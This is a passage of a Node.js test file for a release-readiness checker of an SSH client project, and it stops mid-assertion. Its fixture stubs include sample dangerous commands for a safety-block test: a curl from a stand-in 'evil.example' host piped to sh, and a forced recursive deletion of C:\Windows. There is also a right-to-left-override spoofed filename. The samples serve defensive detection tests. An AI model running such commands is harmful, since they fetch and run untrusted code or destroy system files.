import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import test from "node:test";

const CHECKER_PATH = fileURLToPath(
  new URL("./check-public-release-readiness.mjs", import.meta.url),
);
const releaseScriptNames = [
  "qa",
  "qa:release:public",
  "qa:release:public:local",
  "qa:prod-audit",
  "qa:lighthouse",
  "test:lighthouse-audit",
  "qa:lighthouse-audit",
  "qa:rust-advisory",
  "qa:web-admin-proxy-smoke",
  "qa:web-admin-sync-topology-smoke",
  "qa:web-admin-sync-topology-release-smoke",
  "qa:e2e",
  "qa:e2e:fresh",
  "qa:e2e:web-real-sync",
  "qa:e2e:web-real-sync:fresh",
  "qa:sync:backup-restore-smoke",
  "qa:sync:config-guard-smoke",
  "qa:sync:self-hosted-smoke",
  "qa:sync:release-smoke",
  "qa:tauri",
  "qa:desktop:real-ssh-smoke",
  "qa:desktop:real-ssh-smoke:fixture",
  "qa:desktop:real-ssh-smoke:required",
  "test:desktop-real-ssh-smoke-env",
  "test:desktop-release-package",
  "qa:desktop-release-package",
  "test:desktop-release-evidence",
  "qa:desktop-release-evidence",
  "test:desktop-release-secrets",
  "qa:desktop-release-secrets",
  "test:desktop-release-evidence-download",
  "qa:desktop-release-evidence-download",
  "test:desktop-release-evidence-preflight",
  "qa:desktop-release-evidence-preflight",
  "test:web-release",
  "qa:web-release",
  "test:release-sbom",
  "test:release-publish-preflight",
  "test:release-provenance",
  "test:release-readiness",
  "test:web-admin-bundle-token-scan",
  "test:mobile-public-env",
  "test:sync-release-package",
  "test:sync-release-evidence",
  "test:web-release-verify",
  "qa:release-sbom",
  "qa:release-publish-preflight",
  "qa:release-provenance",
  "qa:release-readiness",
  "qa:web-admin-bundle-token-scan",
  "qa:mobile-public-env",
  "qa:sync-release-package",
  "qa:sync-release-evidence",
  "qa:sync:release-backup-restore-smoke",
  "release:desktop:build",
  "release:desktop:package",
  "release:desktop:checksums",
  "release:desktop:configure-secrets",
  "release:desktop:verify-evidence",
  "release:desktop:evidence-download",
  "release:desktop:evidence-preflight",
  "release:desktop:evidence-workflow",
  "release:desktop:draft",
  "release:publish-preflight",
  "release:provenance",
  "release:provenance:verify",
  "release:verify-checksums",
  "release:sbom",
  "release:sbom:verify",
  "release:sync",
  "release:web",
];

function fixtureScriptValue(name, overrides = {}) {
  if (Object.hasOwn(overrides, name)) {
    return overrides[name];
  }
  if (name === "qa:release:public" || name === "qa:release:public:local") {
    return "npm run qa:mobile-public-env && npm run qa:desktop:real-ssh-smoke:required && npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";
  }
  if (name === "qa:mobile-public-env") {
    return "npm run test:mobile-public-env && node scripts/check-mobile-public-env.mjs";
  }
  if (name === "qa") {
    return "npm run lint && npm run qa:lighthouse-audit && npm run qa:e2e:fresh";
  }
  if (name === "qa:desktop:real-ssh-smoke:required") {
    return "node scripts/require-real-ssh-smoke-env.mjs && npm run qa:desktop:real-ssh-smoke";
  }
  if (name === "qa:desktop:real-ssh-smoke:fixture") {
    return "node scripts/run-real-ssh-smoke-fixture.mjs";
  }
  if (name === "release:desktop:checksums") {
    return "npm run release:desktop:package";
  }
  if (name === "release:desktop:package") {
    return "node scripts/package-desktop-release.mjs --require-platforms windows,macos,linux";
  }
  if (name === "release:desktop:configure-secrets") {
    return "node scripts/configure-desktop-release-secrets.mjs";
  }
  if (name === "release:desktop:evidence-preflight") {
    return "node scripts/desktop-release-evidence-preflight.mjs";
  }
  if (name === "release:desktop:evidence-download") {
    return "node scripts/download-desktop-release-evidence.mjs";
  }
  if (name === "release:desktop:evidence-workflow") {
    return "node scripts/desktop-release-evidence-preflight.mjs --dispatch";
  }
  if (name === "release:verify-checksums") {
    return "node scripts/verify-artifact-checksums.mjs --all-release";
  }
  if (name === "release:provenance") {
    return "node scripts/generate-release-provenance.mjs";
  }
  if (name === "release:provenance:verify") {
    return "node scripts/verify-release-provenance.mjs";
  }
  return "echo ok";
}

function createFixture(t, overrides = {}) {
  const root = mkdtempSync(join(tmpdir(), "public-readiness-"));
  t.after(() => {
    rmSync(root, { recursive: true, force: true });
  });

  const files = {
    "package.json": JSON.stringify({
      version: "0.1.0-beta.1",
      scripts: Object.fromEntries(
        releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
      ),
    }),
    "apps/desktop/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/web/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/mobile/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/mobile/app.json": JSON.stringify({
      expo: { version: "0.1.0-beta.1" },
    }),
    "Cargo.toml": 'version = "0.1.0-beta.1"\n',
    "crates/core/Cargo.toml":
      'russh = { version = "0.61", default-features = false, features = ["ring", "flate2"] }\n',
    "services/sync/Cargo.toml":
      'version = "0.1.0-beta.1"\ndescription = "JoeSSH sync service API"\n',
    "apps/desktop/src-tauri/Cargo.toml": 'version = "0.1.0-beta.1"\n',
    "apps/desktop/src-tauri/tauri.conf.json": JSON.stringify({
      productName: "JoeSSH",
      version: "0.1.0-beta.1",
      identifier: "dev.atlasterm.joessh",
      bundle: { active: true, targets: "all", icon: ["icons/icon.png"] },
      app: { windows: [{ label: "main" }] },
    }),
    ".github/workflows/ci.yml": ciFixture(),
    ".github/workflows/desktop-release-artifacts.yml":
      "Collect macOS DMG diagnostics desktop-macos-dmg-diagnostics bundle_dmg.sh hdiutil info\n",
    ".github/workflows/dependabot-auto-merge.yml":
      "dependency-type\ndirect:development\n",
    "scripts/verify-desktop-release-evidence.mjs":
      "sha256File(fullPath) hash mismatch artifact.sha256 sha256 must match release-evidence-SHA256SUMS.txt missing desktop evidence checksum manifest desktop evidence checksum manifest hash mismatch must mention the artifact path, artifact file name, or artifact sha256\n",
    "scripts/verify-desktop-release-evidence.test.mjs": "",
    "scripts/download-desktop-release-evidence.mjs":
      "Package Formal Desktop Evidence --run-id is required verify-desktop-release-evidence.mjs artifact.expired reports/release/desktop/ check-runs/${checkRunId}/annotations\n",
    "scripts/download-desktop-release-evidence.test.mjs": "",
    "scripts/desktop-release-evidence-preflight.mjs":
      "repos/${repo}/actions/secrets ATLASTERM_WINDOWS_CERTIFICATE ATLASTERM_APPLE_CERTIFICATE formal_evidence=true workflowRunArgs\n",
    "scripts/desktop-release-evidence-preflight.test.mjs": "",
    "scripts/require-real-ssh-smoke-env.mjs":
      "JOESSH_REAL_SSH_SMOKE JOESSH_REAL_SSH_HOST JOESSH_REAL_SSH_PASSWORD JOESSH_REAL_SSH_PRIVATE_KEY_PATH JOESSH_REAL_SSH_REMOTE_DIR JOESSH_REAL_SSH_PORT must be an integer\n",
    "scripts/require-real-ssh-smoke-env.test.mjs": "",
    "scripts/run-real-ssh-smoke-fixture.mjs":
      'reports", "smoke", "desktop", "real-ssh-smoke.json JOESSH_REAL_SSH_PRIVATE_KEY_PATH qa:desktop:real-ssh-smoke:required local forwarding start/traffic/shutdown\n',
    "scripts/package-desktop-release.mjs":
      "artifactSha256 sha256: artifactSha256\n",
    "scripts/package-desktop-release.test.mjs": "",
    "scripts/configure-desktop-release-secrets.mjs":
      'ATLASTERM_WINDOWS_CERTIFICATE_FILE ATLASTERM_APPLE_CERTIFICATE_FILE "secret", "set" --body-file desktop-release-evidence-preflight.mjs\n',
    "scripts/configure-desktop-release-secrets.test.mjs": "",
    "scripts/package-sync-release.mjs":
      "removeStaleSyncReleaseBinaries isSyncReleaseBinaryName SHA256SUMS.txt\n",
    "scripts/package-sync-release.test.mjs": "",
    "scripts/verify-sync-release-evidence.mjs": "",
    "scripts/verify-sync-release-evidence.test.mjs": "",
    "scripts/package-web-release.mjs":
      "isInsideRoot(outputPath) isInsideRoot(checksumPath) Web Admin release output paths must stay inside the release root\n",
    "scripts/package-web-release.test.mjs": "",
    "scripts/verify-web-release-package.mjs": "",
    "scripts/verify-web-release-package.test.mjs": "",
    "scripts/check-web-admin-bundle-token-scan.mjs":
      "ATLASTERM_[A-Z0-9_]*TOKEN bearer token literal high-entropy credential literal\n",
    "scripts/check-web-admin-bundle-token-scan.test.mjs": "",
    "scripts/check-mobile-public-env.mjs":
      "EXPO_PUBLIC_ATLASTERM_SYNC_AUTH_TOKEN Public Beta mobile release builds embedded in the app bundle\n",
    "scripts/check-mobile-public-env.test.mjs": "",
    "scripts/lighthouse-audit.mjs":
      '"web" apps", "web", "dist reports", "lighthouse", "web-admin.json --min-performance defaultThresholds readDeploymentHeaders ?adminSnapshot=fixture /api/admin/snapshot createEmptyAdminSnapshot collectRunWarningFailures runWarnings\n',
    "scripts/smoke-web-admin-proxy.mjs":
      "assertPublicBindFailsClosed assertPublicBindRequiresOperatorToken assertPublicBindRequiresOperatorAuthorization ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND=1 assertInvalidMaxBytesConfigFails assertProxyRejectsOversizedSnapshot upstream_snapshot_too_large\n",
    "scripts/smoke-web-admin-sync-release-topology.mjs":
      "assertWebDist startStaticReleaseServer node-admin-snapshot-proxy.mjs ATLASTERM_SYNC_CORS_ORIGINS assertTopologyEmptySnapshot seedSyncData /v1/devices/register /v1/sync/push assertTopologyPopulatedSnapshot activeMembers healthyDevices assertProxyReplacesBrowserAuthorization assertTopologyAdminTokenError --packaged-release package-sync-release.mjs verify-artifact-checksums.mjs reports/release/sync/SHA256SUMS.txt joessh-sync-${version}-${process.platform}-${process.arch}\n",
    "scripts/smoke-sync-backup-restore.mjs":
      '--packaged-release binaryKind binarySha256 binaryManifest "reports", "release", "sync" "reports", "smoke", "sync" evidenceDirectory\n',
    "scripts/smoke-sync-config-guard.mjs": "",
    "scripts/verify-release-sbom.mjs": "",
    "scripts/verify-release-sbom.test.mjs": "",
    "scripts/generate-release-provenance.mjs":
      'gitFsckStrict ["remote", "get-url", "origin"] release-provenance-SHA256SUMS.txt checksumManifests requiredChecksumManifests reports/release/desktop/release-evidence-SHA256SUMS.txt reports/release/sync/backup-restore-smoke-SHA256SUMS.txt\n',
    "scripts/verify-release-provenance.mjs":
      "source.repository git fsck --strict release notes hash mismatch artifact hash mismatch requiredChecksumManifests unexpected Public Beta checksum manifest is staged\n",
    "scripts/verify-release-provenance.test.mjs": "",
    "scripts/release-publish-preflight.mjs":
      'Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release verify-release-provenance.mjs Verify GitHub CLI publish readiness ATLASTERM_RELEASE_GH_COMMAND auth", "status release", "view", releaseTag already exists; refusing to publish a duplicate release\n',
    "scripts/release-publish-preflight.test.mjs": "",
    "scripts/create-github-release-draft.mjs":
      'collectFiles(resolve(root, "reports", "release"))\nprovenanceVerificationArgs\nif (dryRun)\nprovenanceVerificationArgs.push("--skip-current-git-check")\n',
    "scripts/create-github-release-draft.test.mjs":
      "non-dry-run rejects release provenance from a different Git source\n",
    "apps/desktop/src-tauri/capabilities/main.json": JSON.stringify({
      identifier: "main",
      local: true,
      windows: ["main"],
      permissions: ["allow-open-session"],
    }),
    "apps/desktop/src-tauri/permissions/app-commands.toml":
      '[[permission]]\nidentifier = "allow-open-session"\ncommands.allow = ["open_session"]\n',
    "apps/desktop/src-tauri/src/lib.rs": [
      "tauri::Builder::default().invoke_handler(tauri::generate_handler![open_session]);",
      "// ssh_host_key_probe enum HostKeyProbeStatus struct KnownHostRecord struct KnownHostsFile",
      "// known_hosts_list known_hosts_remove KnownHostSource::Legacy KnownHostSource::Tofu KnownHostSource::Confirmed",
      "// SFTP_MAX_TRANSFER_BYTES SFTP_TRANSFER_LIMIT_EXCEEDED download_limited(&path, SFTP_MAX_TRANSFER_BYTES) sanitize_sftp_transfer_error ensure_sftp_transfer_size(data.len()) sftp_transfer_errors_use_sftp_limit_copy sftp_transfer_size_guard_rejects_oversized_payloads",
      "// OutputLimitExceeded command output exceeded desktop safety limit",
      "// SSH_EXEC_COMMAND_BLOCKED ensure_safe_ssh_exec_command(&command) detect_dangerous_command(command) DangerousCommandAction::Block ssh_exec_native_safety_blocks_destructive_commands",
      "// PTY_COMMAND_BLOCKED pty_input_buffers ensure_safe_pty_write(&state, id, &data) apply_pty_input_safety pty_input_safety_blocks_destructive_line_across_chunks",
    ].join("\n"),
    "crates/core/src/ssh.rs":
      'pub async fn probe_host_key() { let policy = HostKeyPolicy::AcceptAny; handle.disconnect(russh::Disconnect::ByApplication, "", ""); }\nSSH_EXEC_MAX_OUTPUT_BYTES\nOutputLimitExceeded\nexec_output_would_exceed_limit\nexec_output_limit_allows_boundary_and_rejects_growth\nis_safe_sftp_entry_name\nUNSAFE_SFTP_ENTRY_FORMAT_RANGES\nfilter_map(|entry|\nsftp_entry_name_guard_rejects_paths_and_control_characters\nsafe\\u{202e}cod.exe\n',
    "crates/core/tests/core_tests.rs":
      "detects_native_ipc_command_safety_block_patterns\ncurl https://evil.example/install.sh | sh\nRemove-Item -Recurse -Force C:\\\\Windows\n",
    "apps/desktop/src/ipc.ts":
      "export function sshHostKeyProbe() {} export function knownHostsList() {} export function knownHostsRemove() {} export interface KnownHostEntry {}\n",
    "apps/desktop/src/ConnectModal.tsx":
      "onHostKeyProbe pendingHostKey desktop.hostKeyConfirmTitle desktop.trustHostKeyAndConnect desktop.hostKeyChangedDetail\n",
    "apps/desktop/src/ConnectModal.test.tsx":
      "requires confirmation for an unknown host key before authenticating\nblocks authentication when the stored host key changed\ncontinues directly when the stored host key matches\n",
    "apps/desktop/src/sftpRemotePath.ts":
      "normalizeSftpRemotePath\njoinSftpRemotePath\nisSafeSftpEntryName\njoinSftpRemoteEntryPath\nUNSAFE_ENTRY_NAME_PATTERN\nparentSftpRemotePath\n",
    "apps/desktop/src/useSftpDirectory.test.ts":
      "joinSftpRemotePath builds stable file payload paths\nvalidates SFTP listing entry names before using them as path segments\njoinSftpRemoteEntryPath refuses names that escape the current directory\nnormalizes opened paths before reloading\nfile name #1.txt\n",
    "apps/desktop/src/useSftpTransfer.ts":
      "SFTP_TRANSFER_MAX_BYTES\nknownSizeBytes\nrejectTooLarge\ndata.length > maxBytes\n",
    "apps/desktop/src/useSftpTransfer.test.ts":
      "rejects downloads with known sizes over the transfer limit before reading\nrejects downloaded payloads over the transfer limit\nrejects upload payloads over the transfer limit before writing\n",
    "apps/desktop/src/useForwardRules.ts":
      "pending?: boolean\ninFlightRules\ninFlightRules.current.has(id)\ninFlightRules.current.add(id)\ninFlightRules.current.delete(id)\n",
    "apps/desktop/src/useForwardRules.test.ts":
      "ignores duplicate start calls while a forward is pending\nignores duplicate stop calls while a forward stop is pending\ntoHaveBeenCalledTimes(1)\n",
    "apps/desktop/src/panels.tsx":
      "knownHosts.entries knownHosts.onRemove desktop.knownHostFirstSeen desktop.knownHostLastSeen desktop.removeKnownHost desktop.confirmKnownHostRemove desktop.confirmKnownHostsClear pendingKnownHostAction\npendingUploadFile desktop.sftpOverwriteTitle desktop.sftpOverwriteDetail desktop.sftpOverwriteConfirm desktop.sftpOverwriteCancel transfer?.onUpload(pendingUploadFile)\nconst isPending = Boolean(rt?.pending)\ndisabled={!forwards || isPending}\n",
    "apps/desktop/src/panels.test.tsx":
      "lists known-host pins with audit metadata and confirms before removing one pin\nshows the stored known-host count and confirms before clearing them\nSHA256:abc\nRemove host key\nrequires confirmation before overwriting an existing SFTP file\nReplace existing file?\nA file named app.log already exists in this folder.\nOverwrite\ndisables forwarding controls while a start or stop action is pending\npending: true\n",
    "apps/desktop/src/usePtySession.ts":
      "export type PtyStatus\nexitCode\nsetExitCode(code)\nblockedReason\nptyCommandBlockedReason\nresize: (ptyId: string, cols: number, rows: number) => Promise<void>\n",
    "apps/desktop/src/XtermTerminal.tsx":
      'ResizeObserver\nmeasureTerminalDimensions\nterm.resize(next.cols, next.rows)\nresize(next.cols, next.rows)\nstatusLabels.reconnect\nstatusLabels.blocked\nrole={pty.blockedReason !== null ? "alert" : "status"}\nTerminal exited\n',
    "apps/desktop/src/XtermTerminal.test.tsx":
      "resizes the existing terminal and PTY when the container changes size\nshows exit status and reconnects the PTY without rebuilding xterm\nshows native PTY command blocks as an assertive status without closing the terminal\nfirst.deps.open).toHaveBeenCalledTimes(2)\n",
    "apps/desktop/src/usePtySession.test.ts":
      "moves to closed when the pty emits exit\nresult.current.exitCode\nforwards write and resize to the open pty\nsurfaces native PTY command blocks and clears them after a safe write\n",
    "docs/release-checklist.md":
      "Public Beta docs/repository-release-handoff.md SBOM SHA256 SBOM-SHA256SUMS.txt release-evidence.json release-evidence-SHA256SUMS.txt release-provenance.json release-provenance-SHA256SUMS.txt artifact sha256 manifest hash staged cargo-audit qa:rust-advisory qa:lighthouse release:publish-preflight backup-restore-smoke.json qa:sync:backup-restore-smoke unknown-host fingerprint changed-host-key blocking per-host known host removal runtime telemetry rollback\n",
    "docs/repository-release-handoff.md":
      "healthy Git checkout do not publish from the damaged workspace git status --short git fsck --strict git diff --binary release-provenance.json npm run qa:release:public node scripts/check-public-release-readiness.mjs v0.1.0-beta.1\n",
    "docs/release-notes/0.1.0-beta.1.md":
      "JoeSSH 0.1.0-beta.1 Desktop Web Admin Sync Service SHA256 release:publish-preflight\n",
    "docs/desktop-release-metadata.json": JSON.stringify({
      productName: "JoeSSH",
      identifier: "dev.atlasterm.joessh",
      publisher: "JoeSSH Project",
      copyright: "Copyright (c) 2026 JoeSSH contributors",
      category: "Developer Tools",
      bundleTargets: ["windows", "macos", "linux"],
      signingEvidence: {
        windows: "ATLASTERM_DESKTOP_WINDOWS_SIGNATURE_VERIFICATION",
        macosSignature: "ATLASTERM_DESKTOP_MACOS_SIGNATURE_VERIFICATION",
        macosNotarization: "ATLASTERM_DESKTOP_MACOS_NOTARIZATION_VERIFICATION",
      },
      linuxPackageTypes: ["AppImage", "deb", "rpm"],
    }),
    "docs/desktop-distribution.md":
      "Windows sign notarization Linux release-evidence.json release-evidence-SHA256SUMS.txt artifact sha256 manifest hash staged desktop-release-metadata.json capabilities permissions pre-auth host-key probe known-host list/remove/clear unknown hosts require a visible fingerprint confirmation changed host keys are blocked first/last seen metadata 1 MiB 25 MiB bounded SFTP transfer\n",
    "docs/web-admin-deployment.md":
      "The public root path defaults to live Web Admin. _headers CSP VITE_ATLASTERM_ADMIN_SNAPSHOT_URL joessh-web-admin verify-web-release-package.mjs .well-known/security.txt node-admin-snapshot-proxy.mjs ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES upstream_snapshot_too_large 1 MiB qa:web-admin-proxy-smoke qa:lighthouse qa:web-admin-sync-topology-smoke qa:web-admin-sync-topology-release-smoke ?adminSnapshot=fixture\n",
    "docs/self-hosting-sync.md":
      "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker HEALTHCHECK Authorization: Bearer ${ATLASTERM_SYNC_METRICS_TOKEN} qa:sync-release-package qa:sync:release-smoke\n",
    "docs/dependency-risk-register.md":
      "js-yaml GHSA-h67p-54hq-rp68 @opentelemetry/core GHSA-8988-4f7v-96qf esbuild GHSA-g7r4-m6w7-qqqr\n",
    "docs/privacy-public-beta.md": privacyFixture(),
    "deploy/web-admin/node-admin-snapshot-proxy.mjs":
      "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN isAuthorizedBearer timingSafeEqual isLoopbackHost ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES readUpstreamTextWithLimit content-length upstream_snapshot_too_large UpstreamSnapshotTooLargeError\n",
    "services/sync/Dockerfile":
      'ENV ATLASTERM_SYNC_STORAGE_PATH=/var/lib/joessh-sync/ledger.json\nVOLUME ["/var/lib/joessh-sync"]\nHEALTHCHECK CMD curl -fsS "http://127.0.0.1:${ATLASTERM_SYNC_HEALTHCHECK_PORT:-4100}/healthz" || exit 1\n',
    "services/sync/joessh-sync.service.example": "",
    "CHANGELOG.md": "[0.1.0-beta.1]\n",
    "README.md": "# JoeSSH\nWeb Admin console\nnpm run qa:prod-audit\n",
    ".env.example":
      "# JoeSSH Environment Variables\npublic mobile beta builds\nATLASTERM_SYNC_METRICS_TOKEN\nATLASTERM_SYNC_STORAGE_PATH\nATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE\n",
    LICENSE: "Copyright (c) 2026 JoeSSH contributors\n",
    "ARCHITECTURE.md": "Security gate: npm run qa:prod-audit\n",
    "apps/desktop/public/llms.txt":
      "# JoeSSH Workbench\n\nJoeSSH is a local-first remote workbench.\n",
    "apps/desktop/public/humans.txt": "JoeSSH Team\n",
    "apps/desktop/public/sw.js": 'const CACHE_NAME = "joessh-v1";\n',
    "apps/web/public/humans.txt": "JoeSSH Team\n",
    "apps/web/public/sw.js": "const CACHE_NAME = 'joessh-admin-v1';\n",
    "packages/error-monitor/src/index.ts": errorMonitorRuntimeFixture(),
    "packages/error-monitor/src/index.test.ts":
      runtimeDisableTestFixture("error monitor"),
    "apps/desktop/src/main.tsx": `${appShellFixture("desktop")}\nSFTP_TRANSFER_MAX_BYTES\ndesktop.sftpTransferTooLarge\nknownSizeBytes: size\nfile.size > SFTP_TRANSFER_MAX_BYTES\njoinSftpRemoteEntryPath(sftpDirectory.path, name)\njoinSftpRemoteEntryPath(sftpDirectory.path, file.name)\n`,
    "apps/desktop/src/main.test.tsx":
      runtimeDisableTestFixture("desktop shell"),
    "apps/web/src/main.tsx": appShellFixture("web"),
    "apps/web/src/main.test.ts": runtimeDisableTestFixture("web shell"),
    "apps/web/src/adminData.ts":
      "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'fixture' ? 'fixture' : 'live';\nexport function getAdminSnapshotSourceDescriptor() { return { mode: 'live', snapshotUrl: '/api/admin/snapshot', source: 'live' }; }\nconst fixtureDescriptor = { mode: 'fixture', snapshotUrl: null, source: 'fixture' };\nADMIN_SNAPSHOT_MAX_BYTES readResponseJsonWithLimit content-length response.body.getReader Admin snapshot response was too large.\n",
    "apps/web/src/adminData.test.ts":
      "getAdminSnapshotSourceDescriptor('?adminSnapshot=fixture')\ngetAdminSnapshotSourceDescriptor('?adminSnapshot=live')\noversized admin snapshot content-length\noversized streaming admin snapshot bodies\nAdmin snapshot response was too large.\n",
    "apps/web/src/localization.ts":
      "const commonMessages = { 'web.snapshot.status': 'Snapshot status', 'web.snapshot.health.ready': 'Healthy', 'web.snapshot.health.error': 'Unhealthy' };\nreturn localMessages[locale][key] ?? commonMessages[key];\n",
    "apps/web/src/localization.test.ts":
      "web.snapshot.lastRefreshed\nweb.snapshot.health.ready\n",
    ...overrides,
  };

  for (const [path, content] of Object.entries(files)) {
    writeFile(root, path, content);
  }

  return root;
}

function writeFile(root, relativePath, content) {
  const path = join(root, ...relativePath.split("/"));
  mkdirSync(join(path, ".."), { recursive: true });
  writeFileSync(path, content, "utf8");
}

function runChecker(root) {
  return spawnSync(
    process.execPath,
    [CHECKER_PATH, "--root", root, "--allow-unhealthy-git"],
    {
      encoding: "utf8",
    },
  );
}

function ciFixture() {
  return [
    "npm run qa:artifact-checksums",
    "npm run qa:desktop-release-package",
    "npm run qa:desktop-release-evidence",
    "npm run qa:desktop-release-secrets",
    "npm run qa:desktop-release-evidence-download",
    "npm run qa:desktop-release-evidence-preflight",
    "npm run qa:sync-release-package",
    "npm run qa:sync-release-evidence",
    "npm run qa:web-release",
    "npm run qa:release-sbom",
    "npm run qa:release-draft",
    "npm run qa:release-publish-preflight",
    "npm run qa:release-provenance",
    "npm run qa:lighthouse-audit",
    "npm run test:web-admin-bundle-token-scan",
    "npm run qa:e2e:web-real-sync:fresh",
    "npm run qa:e2e:visual:fresh",
    "npm run qa:prod-audit",
    "desktop-real-ssh-smoke",
    'JOESSH_REAL_SSH_SMOKE: "1"',
    "npm run qa:desktop:real-ssh-smoke",
    "npm run qa:lighthouse",
    "npm run qa:tauri",
    "npm run qa:mobile:native-preflight",
    "npm run qa:mobile-public-env",
    "cargo install cargo-audit --locked",
    "cargo audit --deny warnings",
    "npm run release:sbom",
    "npm run release:sbom:verify",
    "npm run qa:e2e:fresh",
    "npm run qa:web-admin-proxy-smoke",
    "npm run qa:web-admin-bundle-token-scan",
    "npm run qa:web-admin-sync-topology-release-smoke",
    "npm run qa:sync:self-hosted-smoke",
    "npm run qa:sync:release-smoke",
    "npm run qa:sync:release-backup-restore-smoke",
    "npm run qa:sync:config-guard-smoke",
    "npm run qa:sync:backup-restore-smoke",
    "node scripts/verify-sync-release-evidence.mjs",
    "node scripts/check-public-release-readiness.mjs",
  ].join("\n");
}

function privacyFixture() {
  return [
    "JoeSSH Public Beta telemetry is opt-in.",
    "SSH host username command path file name private key token terminal output",
    "Runtime Control Evidence",
    "The release readiness gate requires runtime telemetry off implementation evidence.",
    "The code must retain install cleanup and stop new network submissions immediately.",
  ].join("\n");
}

function errorMonitorRuntimeFixture() {
  return `
let telemetryEnabled = true;
const queue = [];
let installCleanup;

export function setTelemetryEnabled(value) {
  telemetryEnabled = value;
  if (!telemetryEnabled) {
    queue.splice(0, queue.length);
    installCleanup?.();
  }
}

export function createErrorMonitor() {
  function report(message) {
    if (!telemetryEnabled) return;
    queue.push(message);
  }

  function flush() {
    if (!telemetryEnabled) return;
    fetch("/telemetry");
  }

  function install() {
    const timer = setInterval(flush, 1000);
    window.addEventListener("error", report);
    installCleanup = () => {
      window.removeEventListener("error", report);
      clearInterval(timer);
    };
    return installCleanup;
  }

  return { report, flush, install, setTelemetryEnabled, disable: () => setTelemetryEnabled(false) };
}
`;
}

function appShellFixture(name) {
  return `
import { createErrorMonitor, createNoopErrorMonitor } from "@atlasterm/error-monitor";

const env = import.meta.env;
const telemetryConsent = localStorage.getItem("${name}:telemetryConsent");
const monitor = env.VITE_ATLASTERM_TELEMETRY_OPT_IN === "1" && telemetryConsent === "enabled"
  ? createErrorMonitor({ app: "${name}", version: "0.1.0-beta.1" })
  : createNoopErrorMonitor();
let telemetryCleanup = monitor.install();

window.addEventListener("storage", () => {
  telemetryCleanup?.();
  monitor.disable?.();
});

const snapshotOpsSurface = "snapshotStatus web.snapshot.lastRefreshed web.snapshot.lastSuccess getDashboardLastSuccess dashboardStateRef";
`;
}

function runtimeDisableTestFixture(name) {
  return `
it("${name} runtime telemetry disable/off cleans up transport and stops new network submissions", () => {
  const fetch = vi.fn();
  expect(fetch).not.toHaveBeenCalled();
});
`;
}

test("accepts release readiness when runtime telemetry control evidence is present", (t) => {
  const result = runChecker(createFixture(t));

  assert.equal(result.status, 0, result.stdout + result.stderr);
  assert.match(result.stdout, /Public Beta release readiness checks passed/);
});

test("rejects missing error-monitor runtime telemetry disable implementation evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "packages/error-monitor/src/index.ts":
        "export function createErrorMonitor() { return { report() {}, flush() {}, install() {} }; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Error monitor exposes runtime telemetry disable\/consent control/,
  );
  assert.match(
    result.stdout,
    /FAIL Error monitor clears pending telemetry when runtime telemetry is disabled/,
  );
});

test("rejects missing app-shell runtime telemetry off test evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/main.test.ts":
        "it('keeps telemetry default-off', () => {});\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web app shell tests cover runtime telemetry off/,
  );
});

test("rejects privacy docs that omit the runtime telemetry readiness wording", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/privacy-public-beta.md":
        "opt-in SSH host username command path file name private key token terminal output\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public Beta privacy note mentions 'runtime'/,
  );
  assert.match(
    result.stdout,
    /FAIL Privacy note documents runtime telemetry control evidence/,
  );
});

test("rejects Web Admin fixture data as the public default", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/adminData.ts":
        "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'live' ? 'live' : 'fixture';\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin defaults to live admin snapshots unless fixture is explicit/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin does not default public roots to fixture data/,
  );
});

test("rejects Web Admin live snapshot loaders without a response size cap", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/adminData.ts":
        "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'fixture' ? 'fixture' : 'live';\nexport function getAdminSnapshotSourceDescriptor() { return { mode: 'live', snapshotUrl: '/api/admin/snapshot', source: 'live' }; }\nconst fixtureDescriptor = { mode: 'fixture', snapshotUrl: null, source: 'fixture' };\nreturn response.json();\n",
      "apps/web/src/adminData.test.ts":
        "getAdminSnapshotSourceDescriptor('?adminSnapshot=fixture')\ngetAdminSnapshotSourceDescriptor('?adminSnapshot=live')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin live snapshot loader caps response bytes before JSON parsing/,
  );
  assert.match(
